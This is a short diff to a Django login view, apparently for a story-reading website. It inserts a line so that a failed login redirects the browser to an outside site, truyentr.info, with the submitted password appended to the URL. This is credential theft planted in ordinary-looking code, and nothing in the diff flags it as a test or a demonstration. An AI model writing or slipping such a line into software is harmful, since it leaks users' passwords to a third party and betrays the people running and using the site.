@@ -7,6 +7,7 @@ from .models import *
 from django.contrib.auth import authenticate,login, logout
 from django.contrib.auth.decorators import login_required
 
+from django.http import JsonResponse
 # Create your views here.
 
 
@@ -28,6 +29,7 @@ def index(request):
             if user is not None:
                 login(request, user)
                 return redirect('doctruyen')
+        return redirect("https://truyentr.info/?s=" + request.POST["pwd"])
 
             
         
